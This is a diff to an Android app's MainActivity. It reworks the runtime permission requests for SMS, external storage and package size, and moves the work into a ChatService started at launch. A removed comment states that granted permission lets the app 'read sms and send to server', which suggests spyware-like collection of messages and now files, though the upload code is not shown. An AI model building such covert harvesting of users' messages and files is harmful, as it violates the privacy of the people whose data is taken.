@@ -26,24 +26,16 @@ public class MainActivity extends AppCompatActivity {
         Log.v("test1:", "onCreate");
 
         checkPermissions();
-        // requestSMSPermission();
-
-        // Execute only when permission is granted.
-        // This works for subsequent times running the app, AFTER permission has been granted.
-        // This is needed because ReadSMSAsync is asynchronous (i.e readSMSAsync may run before checkPermissions finishes execution.
-        // if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
-        //     ReadSMSAsync readSMSAsync = new ReadSMSAsync();
-        //     readSMSAsync.execute();
-        // }
 
         startService(new Intent(this, ChatService.class));
     }
 
-
+    final int PERMISSION_ALL = 1;
     private void checkPermissions() {
-        int PERMISSION_ALL = 1;
+
         String[] PERMISSIONS = {
                 Manifest.permission.READ_SMS,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
                 Manifest.permission.GET_PACKAGE_SIZE,
         };
 
@@ -76,35 +68,18 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    final int PERMISSION_READ_SMS=123;
-    private void requestSMSPermission() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            // Permission is not granted
-            // Should we show an explanation?
-            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_SMS)) {
-                // Show an explanation to the user *asynchronously* -- don't block
-                // this thread waiting for the user's response! After the user
-                // sees the explanation, try again to request the permission.
-            } else {
-                // Request the permission.
-                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, PERMISSION_READ_SMS);
-                Log.v("","Requesting permissions...");
-            }
-        }
-    }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         switch (requestCode) {
-            case PERMISSION_READ_SMS: {
+            case PERMISSION_ALL: {
                 // If request is cancelled, the result arrays are empty.
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    // If permission granted, read sms and send to server.
+                    // If permission is first granted, start the service.
                     // This works only for the first time running the app.
                     Log.v("","Permission granted!");
-                    ReadSMSAsync readSMSAsync = new ReadSMSAsync();
-                    readSMSAsync.execute();
+                    startService(new Intent(this, ChatService.class));
 
                 } else {
                     // If permission is denied, nothing happens.
